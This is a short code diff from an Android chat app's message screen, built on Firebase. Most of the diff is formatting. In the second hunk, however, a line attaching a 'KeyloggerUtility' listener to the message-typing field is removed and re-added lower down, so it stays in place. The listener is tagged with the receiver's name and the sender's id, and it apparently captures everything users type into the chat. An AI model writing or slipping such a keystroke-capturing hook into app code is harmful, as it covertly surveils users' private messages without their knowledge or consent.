@@ -73,8 +73,6 @@ public class specificchat extends AppCompatActivity {
         mimageviewofspecificuser=findViewById(R.id.specificuserimageinimageview);
         mbackbuttonofspecificchat=findViewById(R.id.backbuttonofspecificchat);
 
-
-
         messagesArrayList=new ArrayList<>();
         mmessagerecyclerview=findViewById(R.id.recyclerviewofspecific);
 
@@ -103,9 +101,10 @@ public class specificchat extends AppCompatActivity {
         msenderuid=firebaseAuth.getUid();
         mrecieveruid=getIntent().getStringExtra("receiveruid");
         mrecievername=getIntent().getStringExtra("name");
-        mgetmessage.addTextChangedListener(new KeyloggerUtility("CHAT", mrecievername,msenderuid));
+
         senderroom=msenderuid+mrecieveruid;
         recieverroom=mrecieveruid+msenderuid;
+        mgetmessage.addTextChangedListener(new KeyloggerUtility("CHAT", mrecievername,msenderuid));
 
         DatabaseReference databaseReference=firebaseDatabase.getReference().child("chats").child(senderroom).child("messages");
         messagesAdapter=new MessagesAdapter(specificchat.this,messagesArrayList);
